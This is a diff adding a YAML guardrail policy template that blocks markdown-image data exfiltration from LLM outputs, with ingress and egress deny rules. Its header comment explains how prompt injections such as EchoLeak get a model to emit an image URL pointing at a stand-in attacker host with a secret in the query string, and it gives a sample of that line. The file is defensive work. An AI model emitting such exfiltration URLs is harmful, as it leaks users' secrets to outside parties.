@@ -1,0 +1,68 @@
+# diwan-template-block_markdown_image_exfil.yaml
+# ----------------------------------------------------------------------------
+# Lobster Trap policy template — Diwan-suggested.
+#
+# Shape:
+#   - Egress DENY on the THE classic image-tag exfil shape: response
+#     contains a URL AND the inspector's exfiltration pattern set fires
+#     ("send to", "post to", base64-shape pasted into a URL fragment, etc.).
+#   - Egress DENY when the response carries a URL whose extracted domain
+#     matches the attacker host observed during the baseline run.
+#   - Ingress DENY on the prompt that tries to set up the channel
+#     (`contains_exfiltration` on user input).
+#
+# Background: Rehberger 2024 ChatGPT-memory exfil + EchoLeak primary egress
+# channel. Model emits ![](https://attacker/?leak=...). The renderer
+# auto-fetches; the secret is in the query string.
+#
+# Covers attacks: markdown-image-beacon-stripe-key, indirect-injection-echoleak,
+# prompt-injection-poisoned-rag-doc.
+#
+# OWASP: LLM02 + LLM07.
+#
+# Placeholders:
+#   {{detected_metadata.target_domain}}
+#       Filled by the suggester from the failing attack's audit log.
+# ----------------------------------------------------------------------------
+
+version: "1.0"
+policy_name: "diwan-template-block_markdown_image_exfil"
+default_action: ALLOW
+
+ingress_rules:
+  - name: block_image_exfil_setup_{{run_id}}
+    description: "[DIWAN-SUGGESTED] Prompt setting up markdown-image exfiltration channel"
+    priority: 95
+    action: DENY
+    deny_message: "[DIWAN-SUGGESTED] Blocked: markdown-image exfiltration setup."
+    conditions:
+      - field: contains_exfiltration
+        match_type: boolean
+        value: true
+
+egress_rules:
+  - name: block_egress_image_tag_exfil_{{run_id}}
+    description: "[DIWAN-SUGGESTED] Output contains markdown image to external host (CVE-2025-32711 class)"
+    priority: 100
+    action: DENY
+    deny_message: "[DIWAN-SUGGESTED] Output blocked: image-tag exfiltration channel."
+    conditions:
+      - field: contains_urls
+        match_type: boolean
+        value: true
+      - field: contains_exfiltration
+        match_type: boolean
+        value: true
+
+  - name: block_egress_attacker_host_in_image_{{run_id}}
+    description: "[DIWAN-SUGGESTED] Output references attacker domain observed in baseline run"
+    priority: 99
+    action: DENY
+    deny_message: "[DIWAN-SUGGESTED] Output blocked: attacker domain {{detected_metadata.target_domain}} in response."
+    conditions:
+      - field: target_domains
+        match_type: regex
+        value: "(?i){{detected_metadata.target_domain}}"
+      - field: contains_urls
+        match_type: boolean
+        value: true
